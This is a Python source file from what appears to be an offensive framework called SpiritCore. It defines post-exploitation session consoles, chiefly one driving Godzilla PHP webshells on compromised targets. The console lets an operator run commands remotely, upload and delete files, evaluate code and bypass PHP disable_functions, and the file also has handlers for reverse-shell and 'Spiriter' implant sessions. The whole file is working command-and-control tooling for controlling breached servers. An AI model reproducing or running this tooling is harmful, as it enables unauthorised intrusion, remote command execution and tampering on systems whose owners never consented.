from SpiritCore.Lib.Spiriter import Spiriter
from SpiritCore.System import *
from SpiritCore.FCmd import *
from SpiritCore.Lib.Godzilla.PHP import *
import requests,re,base64,threading,time
import os,sys,getopt
import uuid
class PhpSessionConsole(Cmd):
    Object=None
    def __init__(self):
        Cmd.__init__(self)
    def Init(self,Object):
        self.Object=Object
    def do_info(self,line):
        print_msg("View Target information")
        write(self.Object.Object.GetInfo())
    def do_upload(self,files):
        Path = self.Object.Path
        line=""
        print_msg("Upload File")
        if files=="":
            print_msg("Upload -f <Local File> -o <Upload Path>")
            return
        try:
            opts, args = getopt.getopt(files.split(" "),"hf:o:",["file=","output="])
        except:
            print_msg("Upload -f <Local File> -o <Upload Path>")
            return
        for opt, arg in opts:
            if opt == '-h':
                print_msg("Upload -f <Local File> -o <Upload Path>")
                return
            elif opt in ("-f", "-file"):
                line= arg
            elif opt in ("-o","output="):
                Path=arg
        if os.path.exists(line):
            Recv = self.Object.Object.UploadFile(line,self.Object.Path)
            if Recv=="":
                print_error("Upload Error")
            else:
                print_success("Upload:%s"%Recv)
        else:
            print_error("File Not exists")
    def do_bypassdisablefunction(self,line):
        print_msg("Turn bypass Disable Function")
        try:
            self.Object.Object.BypassDisableFunction(Arch="x64",Path=self.Object.Path)
        except:
            print_error("Turn Failed ~_~")
    def do_shell(self,line):
        self.PHP_SHELL(line)
    def sdo_eval(self,line):
        Eval = line
        self.Object.Object.EvalCode(Eval)
    def PHP_SHELL(self,line):
        print_msg("Execute Command ")
        if line=="":
            print_error("shell <Command>")
            return
        try:
            if self.Object.Object.UseBypassDisableFunction==0 or self.Object.Object.UseBypassDisableFunction==2:
                try:
                    Data = self.Object.Object.ExecuteCommand(line,Path=self.Object.Path)

                    if Data[0]=="none of proc_open/passthru/shell_exec/exec/exec is available":
                        print_error("Target has Disable Function turned on!")
                        return
                    write(Data[0])
                except:
                    return
                try:
                    Path = Data[1].replace("\n","")
                    self.prompt=TextColor(Path,COLO_RED) + " >"
                    self.Object.Path=Path
                except Exception as error:
                    Path = Data[1]
                    self.prompt = TextColor(Path, COLO_RED) + " >"
                    self.Object.Path = Path
            elif self.Object.Object.UseBypassDisableFunction==1:
                Data =self.Object.Object.ExecuteCommand(line, Path=self.Object.Path)
                write(Data[0])
        except Exception as errors:
            try:
                try:
                    Data = self.Object.Object.ExecuteCommand(line, Path=self.Object.Path)
                    if Data[0] == "none of proc_open/passthru/shell_exec/exec/exec is available":
                        print_error("Target has Disable Function turned on!")
                        return
                    write(Data[0])
                except:
                    return
                try:
                    Path = Data[1].replace("\n", "")
                    self.prompt = TextColor(Path, COLO_RED) + " >"
                    self.Object.Path = Path
                except Exception as error:
                    Path = Data[1]
                    self.prompt = TextColor(Path, COLO_RED) + " >"
                    self.Object.Path = Path
            except Exception as error:
                write(error)
    def do_ls(self,line):
        #dirName
        #getFile
        print_msg("Get %s  files"%self.Object.Path)
        write(self.Object.Object.GetFiles(self.Object.Path))
    def do_rm(self,line):
        if line=="":
            print_msg("rm File/Dir")
        self.Object.Object.DelectDir(line)
    def do_pwd(self,line):
        self.do_shell("pwd")
    def cmdloop(self, intro=None):
        """Repeatedly issue a prompt, accept input, parse an initial prefix
        off the received input, and dispatch to action methods, passing them
        the remainder of the line as argument.

        """

        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey + ": complete")
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro) + "\n")
            stop = None
            while not stop:
                line = ""

                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                else:
                    if self.use_rawinput:
                        try:
                            if sys.version_info.major == 2:

                                line = raw_input(self.prompt)
                                # write(line)
                            else:
                                line = str(input(self.prompt))  # stdout stdin Not Support TAB Key
                                '''sys.stdout.write(self.prompt)
                                sys.stdout.flush()
                                line = sys.stdin.readline()
                                if not len(line):
                                    line = 'EOF'
                                else:
                                    line = line.rstrip('\r\n')
                                    '''
                        except EOFError:
                            line = 'EOF'
                        except:
                            print_warning("Back Console")
                            return;
                    else:
                        self.stdout.write(self.prompt)
                        self.stdout.flush()
                        line = self.stdin.readline()
                        if not len(line):
                            line = 'EOF'
                        else:
                            line = line.rstrip('\r\n')
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass



class SessionConsole(Cmd):
    Object=None
    def __init__(self):
        Cmd.__init__(self)
    def Init(self,Object):
        self.Object=Object
    def do_info(self,line):
        pass
    def do_upload(self,files):
        pass
    def do_shell(self,line):
        pass
    def PHP_SHELL(self,line):
        pass
    def do_ls(self,line):
        pass
    def do_rm(self,line):
        pass
    def do_pwd(self,line):
        pass
    def cmdloop(self, intro=None):
        """Repeatedly issue a prompt, accept input, parse an initial prefix
        off the received input, and dispatch to action methods, passing them
        the remainder of the line as argument.

        """

        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey + ": complete")
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro) + "\n")
            stop = None
            while not stop:
                line = ""

                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                else:
                    if self.use_rawinput:
                        try:
                            if sys.version_info.major == 2:
                                line = raw_input(self.prompt)
                                # write(line)
                            else:
                                line = str(input(self.prompt))  # stdout stdin Not Support TAB Key
                                '''sys.stdout.write(self.prompt)
                                sys.stdout.flush()
                                line = sys.stdin.readline()
                                if not len(line):
                                    line = 'EOF'
                                else:
                                    line = line.rstrip('\r\n')
                                    '''
                        except EOFError:
                            line = 'EOF'
                    else:
                        self.stdout.write(self.prompt)
                        self.stdout.flush()
                        line = self.stdin.readline()
                        if not len(line):
                            line = 'EOF'
                        else:
                            line = line.rstrip('\r\n')
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass






def SessionStart(self):
    SessionObj = Session(self.Object)
    SessionObj.TargetOS =self.Object.UsePayloadObject.OS
    SessionObj.PayloadType=self.Object.UsePayloadObject.Types
    SessionObj.SObject=self.Object
    WriteLogs("Call Payload the Handler %s"%self.Object.UsePayloadObject.Name)
    SessionObj.start()
    try:
        SessionObj.Console("")
    except Exception as error:
        write("Error Handler:Exploit:30")
        print_error(error.__str__())
        return







class Session(threading.Thread):
    UUID=""
    SObject=None
    Payload=""
    TargetIp=""
    PayloadType="None"
    SessionInfo=""
    TargetOS=0
    SpiritObject= None
    OsVersion= ""    #Kernel Name    or     Windows x
    Object=None
    SessionSocket=None
    TargetType=00
    SpiriterSession={}
    ListThread=None
    Parameate={}
    Path = ""
    def __init__(self,Object):
        threading.Thread.__init__(self)
        self.Object=Object

    def run(self):  #
        pass




    def Console(self,UUID):
        if self.Payload=="Godzilla/PHP":
            SessionConsoleObj = PhpSessionConsole()
            SessionConsoleObj.Init(self)
            SessionConsoleObj.prompt = "Spirit %s >"%TextColor(self.Path,COLO_RED)
            try:
                SessionConsoleObj.cmdloop()
            except KeyboardInterrupt as Error:
                #SessionConsoleObj.Object.Object
                return
        elif self.PayloadType=="Shell":
            self.Object=self.SObject.UsePayloadObject
            self.SessionSocket = self.Object.Console(self.SessionSocket)
            self.UUID = uuid.uuid1().__str__()
            print_success("UUID:%s   " % (self.UUID))
            self.SObject.SessionManager.update({self.UUID: self})
            self.SObject.UsePayloadObject.SetUUidSession(self.UUID)
            
        elif self.PayloadType=="Spiriter":
            WriteLogs("Create Spiriter Session Manager")
            self.Object=self.SObject.UsePayloadObject
            try:
                self.Object.SObject=self.SObject
                self.Object.SessionObject=self
                if UUID=="":
                    self.Object.Listen(self)
            except Exception as error:
                print_error(error.__str__())
            if UUID!="":
                self.Object.Console(self.SpiriterSession[UUID])
            return
            self.UUID = uuid.uuid1().__str__()
            print_success("UUID:%s   " % (self.UUID))
            self.SObject.SessionManager.update({self.UUID: self})
            self.SObject.UsePayloadObject.SetUUidSession(self.UUID)













